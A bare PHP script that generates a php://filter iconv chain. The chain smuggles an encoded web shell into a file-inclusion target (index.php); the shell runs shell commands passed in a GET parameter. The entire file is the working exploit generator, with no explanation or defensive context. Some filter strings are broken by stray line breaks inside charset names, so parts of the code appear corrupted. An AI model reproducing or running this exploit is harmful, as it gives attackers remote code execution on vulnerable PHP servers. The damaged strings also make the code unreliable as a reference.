<?php
$base64_payload = "PD89YCRfR0VUWzFdYDs/Pg==";
$conversions = array(
    '/' =>
        'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF8|convert.iconv.CSISOLATIN6.UCS-4',
    '0' =>
        'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.
UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',
    '1' => 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    '2' => 'convert.iconv.L5.UTF32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.
ISO_69372.CSIBM921',
    '3' => 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
    '4' =>
        'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS
2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2',
    '5' => 'convert.iconv.L5.UTF32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF8|convert.iconv.IEC_P27-1.UCS-4LE',
    '6' => 'convert.iconv.UTF8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.i
conv.IBM866.UCS-2',
    '7' =>
        'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS
2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',
    '8' =>
        'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.
L6.UCS2',
    '9' =>
        'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.
ISO6937.JOHAB',
    'A' => 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'B' =>
        'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF
16.EUCTW|convert.iconv.CP1256.UCS2',
    'C' => 'convert.iconv.UTF8.CSISO2022KR',
    'D' =>
        'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS
2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',
    'E' => 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR143.ISO2022CNEXT',
    'F' => 'convert.iconv.L5.UTF32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert
.iconv.UHC.JOHAB',
    'G' => 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H' =>
        'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
    'I' => 'convert.iconv.L5.UTF32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
    'J' => 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'K' => 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
    'L' =>
        'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO693
7|convert.iconv.OSF00010100.UHC',
'M' => 'convert.iconv.CP869.UTF32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAI
NIAN.WCHAR_T',
'N' => 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
'O' => 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP3|convert.iconv.ISO2022JP2.CP775',
'P' => 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
'Q' => 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
'R' => 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
'S' => 'convert.iconv.UTF8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
'T' => 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
'U' =>
'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.
CP1133.IBM932',
'V' => 'convert.iconv.CP861.UTF16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
'W' => 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM932|convert.iconv.MS932.MS936',
'X' => 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
'Y' => 'convert.iconv.CP367.UTF16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
'Z' => 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM932|convert.iconv.BIG5HKSCS.UTF16',
'a' => 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
'b' =>
'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
'c' => 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
'd' =>
'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS
2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',
'e' =>
'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JPMS|convert.iconv.ISO-8859-1.ISO_6937',
'f' => 'convert.iconv.CP367.UTF16|convert.iconv.CSIBM901.SHIFT_JISX0213',
'g' => 'convert.iconv.SE2.UTF16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM932.UTF-8',
'h' => 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
'i' => 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-
2|convert.iconv.UTF16.GB13000',
'j' => 'convert.iconv.CP861.UTF16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF
16',
'k' => 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
'l' => 'convert.iconv.CPAR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF32LE|convert.iconv.IBM932.UCS-2BE',
'm' => 'convert.iconv.SE2.UTF16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv
.UCS-2.MSCP949',
'n' =>
'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32
BE.MS936|convert.iconv.OSF00010004.T.61',
'o' =>
'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
'p' => 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-
14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
'q' => 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
'r' =>
'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR99.UCS-2BE|convert.iconv.L4.OSF00010101',
's' => 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
't' => 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
'u' => 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
'v' => 'convert.iconv.851.UTF16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-
2:1983.R9|convert.iconv.OSF00010005.IBM-932',
'w' => 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
'x' => 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
'y' => 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
'z' => 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
);
$filters = "convert.base64-encode|";
$filters .= "convert.iconv.UTF8.UTF7|";
foreach (str_split(strrev($base64_payload)) as $c) {
    $filters .= $conversions[$c] . "|";
    $filters .= "convert.base64-decode|";
    $filters .= "convert.base64-encode|";
    $filters .= "convert.iconv.UTF8.UTF7|";
}
$filters .= "convert.base64-decode";
$final_payload = "php://filter/{$filters}/resource=index.php";
echo $final_payload;